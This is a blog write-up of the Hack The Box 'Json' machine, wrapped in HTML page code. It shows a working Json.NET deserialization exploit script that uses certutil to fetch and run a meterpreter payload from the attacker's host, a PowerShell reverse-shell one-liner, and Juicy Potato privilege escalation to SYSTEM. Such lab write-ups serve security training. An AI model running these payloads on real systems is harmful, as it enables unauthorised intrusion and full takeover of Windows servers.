[10.10.10.158] 52604 PS C:\\Windows\\system32&gt; whoami nt authority\\system root.txt 1 2 PS C:\\Windows\\system32&gt; more C:\\Users\\superadmin\\Desktop\\root.txt 3cc8XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/json-htb/","@type":"BlogPosting","headline":"Hack The Box - Json","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-02-16T01:41:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Json | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Json</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Json</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Feb 16, 2020, 1:41 AM +0800" > Feb 16, 2020 <i class="unloaded">2020-02-16T01:41:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1319 words">7 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/json.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating systems that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.158 json.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> json.htb
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-01-17 23:17 EST
Nmap scan report <span class="k">for </span>json.htb <span class="o">(</span>10.10.10.158<span class="o">)</span>
Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Json HTB
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h01m13s, deviation: 0s, median: 4h01m13s
|_nbstat: NetBIOS name: JSON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:bd:00:23 <span class="o">(</span>VMware<span class="o">)</span>
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2020-01-18T08:19:44
|_  start_date: 2020-01-18T07:11:14

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>82.99 seconds
</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><p>When trying the access the <code class="language-plaintext highlighter-rouge">ftp</code> service, I wasn’t able to login anonymously, hence I went straight for the <code class="language-plaintext highlighter-rouge">http</code> service. Something weird actually happens because it went from what seems to be a dashboard:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/json1.png" alt="" /></p><p>to a login page at <code class="language-plaintext highlighter-rouge">/login.html</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/json2.png" alt="" /></p><p>Tried some default usernames and passwords and <code class="language-plaintext highlighter-rouge">admin:admin</code> worked! I guess the usage of the <code class="language-plaintext highlighter-rouge">StartBootStrap Admin</code> theme was a hint. After logging in, we were directed back to the dashboard. Someone probably didn’t implement things correctly haha</p><p>Among the requests sent during the login, there was a suspicous <code class="language-plaintext highlighter-rouge">GET</code> request being sent to <code class="language-plaintext highlighter-rouge">/api/account</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/json3.png" alt="" /></p><p>The response was:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>{ 
    "Id":1,
    "UserName":"admin",
    "Password":"21232f297a57a5a743894a0e4a801fc3",
    "Name":"User Admin HTB",
    "Rol":"Administrator"
}
</pre></table></code></div></div><p>No requests parameters were sent so maybe the <code class="language-plaintext highlighter-rouge">OAuth2</code> token in the <code class="language-plaintext highlighter-rouge">Bearer</code> header has something to do with it? The session value also had the same value for some reason. When to <code class="language-plaintext highlighter-rouge">base64</code>-decoding it, we got the same exact content as the response.</p><p>Lets try to cause some <code class="language-plaintext highlighter-rouge">base64</code>-decoding issues and hopefully see some errors :)</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
	<span class="s">"Bearer"</span><span class="p">:</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s">"something"</span><span class="p">)</span>
<span class="p">}</span>

<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://json.htb/api/Account/"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
</pre></table></code></div></div><p>Running the above script got:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>b'{"Message":"An error has occurred.","ExceptionMessage":"Cannot deserialize Json.Net Object","ExceptionType":"System.Exception","StackTrace":null}'
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Json.Net</code>? Didn’t know how to exploit but I came across this <a href="https://github.com/pwntester/ysoserial.net">tool</a> that is able to generate some sort of payload to execute commands ? What was neat was that the first example actually suited our needs and all we have to do is change the command executed.</p><h1 id="exploitation-1">Exploitation (1)</h1><p>First, we need to generate our <code class="language-plaintext highlighter-rouge">meterpreter</code> payload and serve it using <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code> on port 80.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.XX.XX <span class="nv">LPORT</span><span class="o">=</span>XXXX <span class="nt">-f</span> exe <span class="o">&gt;</span> shell.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
<span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
</pre></table></code></div></div><p>Next, we set up our reverse shell handler using <code class="language-plaintext highlighter-rouge">msfconsole</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfconsole
msf5 <span class="o">&gt;</span> use exploit/multi/handler
msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.XX.XX
LHOST <span class="o">=&gt;</span> 10.10.XX.XX
msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 4444
LPORT <span class="o">=&gt;</span> XXXX
msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run                                                                            
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.XX.XX:XXXX
</pre></table></code></div></div><p>And now our exploit script to pull everything together:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="n">IP</span> <span class="o">=</span> <span class="s">"10.10.XX.XX"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="s">"XXXX"</span>

<span class="n">template</span> <span class="o">=</span> <span class="sa">r</span><span class="s">"""
{
    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "MethodParameters":{
        "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values":["cmd","/c %s"]
    },
    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
}
"""</span>

<span class="n">commands</span> <span class="o">=</span> <span class="p">[</span>
	<span class="sa">r</span><span class="s">"mkdir c:\\tmp"</span><span class="p">,</span>
	<span class="sa">r</span><span class="s">"certutil -f -split -urlcache http://%s:%s/shell.exe c:\\tmp\\shell.exe"</span> <span class="o">%</span> <span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">),</span>
	<span class="sa">r</span><span class="s">"c:\\tmp\\shell.exe"</span>
<span class="p">]</span>

<span class="k">for</span> <span class="n">command</span> <span class="ow">in</span> <span class="n">commands</span><span class="p">:</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="n">template</span> <span class="o">%</span> <span class="p">(</span><span class="n">command</span><span class="p">,)</span>
	<span class="n">minified</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="p">)).</span><span class="n">encode</span><span class="p">()</span>

	<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s">"Bearer"</span><span class="p">:</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">minified</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://json.htb/api/Account/"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</pre></table></code></div></div><p>Running the script got us our session ! :)</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>[*] Sending stage (180291 bytes) to 10.10.10.158
[*] Meterpreter session 1 opened (10.10.XX.XX:XXXX -&gt; 10.10.10.158:52355) at 2020-02-15 09:29:17 -0500
meterpreter &gt; getuid
Server username: JSON\userpool
</pre></table></code></div></div><h1 id="usertxt">user.txt</h1><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>meterpreter &gt; shell
Process 676 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv&gt;more C:\Users\userpool\Destkop\user.txt
3445XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>If we look at what privileges we have as <code class="language-plaintext highlighter-rouge">userpool</code>,</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>c:\windows\system32\inetsrv&gt;whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
</pre></table></code></div></div><p>According to <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">PayloadAllTheThings</a>, if we got <code class="language-plaintext highlighter-rouge">SeImpersonate</code> or <code class="language-plaintext highlighter-rouge">SeAssignPrimaryToken</code> privileges (which is this case we have both), we can use <a href="https://github.com/ohpe/juicy-potato"><code class="language-plaintext highlighter-rouge">Juicy Potato</code></a>.</p><p>First we create a <code class="language-plaintext highlighter-rouge">.bat</code> script to run a <code class="language-plaintext highlighter-rouge">Powershell</code> command that connects back to us.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.XX.XX',XXXX); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (IEX $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; $client.Close()"
</pre></table></code></div></div><p>Then we use <code class="language-plaintext highlighter-rouge">meterpreter</code> to upload the files to the box:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>meterpreter &gt; upload /root/Desktop/web/x.bat C:\\tmp
[*] uploading  : /root/Desktop/web/x.bat -&gt; C:\tmp
[*] uploaded   : /root/Desktop/web/x.bat -&gt; C:\tmp\x.bat
meterpreter &gt; upload /root/Desktop/web/JuicyPotato.exe C:\\tmp
[*] uploading  : /root/Desktop/web/JuicyPotato.exe -&gt; C:\tmp
[*] uploaded   : /root/Desktop/web/JuicyPotato.exe -&gt; C:\tmp\JuicyPotato.exe
</pre></table></code></div></div><p>Next we start a listener on our machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> XXXX
listening on <span class="o">[</span>any] XXXX ...
</pre></table></code></div></div><p>To use <code class="language-plaintext highlighter-rouge">JuicyPotato.exe</code>, we need to know the <code class="language-plaintext highlighter-rouge">CLSID</code> based on the box’s Windows version <code class="language-plaintext highlighter-rouge">Microsoft Windows Server 2012 R2 Datacenter</code> (The version can be retrieved by running <code class="language-plaintext highlighter-rouge">systeminfo</code> on the box.). The CLSID can be gotten from <a href="https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/">here</a>. Make sure the User belonging to the CLSID you have chosen is <code class="language-plaintext highlighter-rouge">NT AUTHORITY/SYSTEM</code>.</p><p>The last step would be to run <code class="language-plaintext highlighter-rouge">JuicyPotato.exe</code> on the box.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>c:\tmp&gt; JuicyPotato.exe -l XXXX -p c:\tmp\x.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} XXXX
....
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
</pre></table></code></div></div><p>On our listener, we caught the connection:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.158] 52604
PS C:\Windows\system32&gt; whoami
nt authority\system
</pre></table></code></div></div><h1 id="roottxt">root.txt</h1><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>PS C:\Windows\system32&gt; more C:\Users\superadmin\Desktop\root.txt
3cc8XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/json-net/" class="post-tag no-text-decoration" >json.net</a> <a href="/tags/juicypotato/" class="post-tag no-text-decoration" >juicypotato</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Json - rizemon's blog&url=https://rizemon.github.io/posts/json-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Json - rizemon's blog&u=https://rizemon.github.io/posts/json-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" 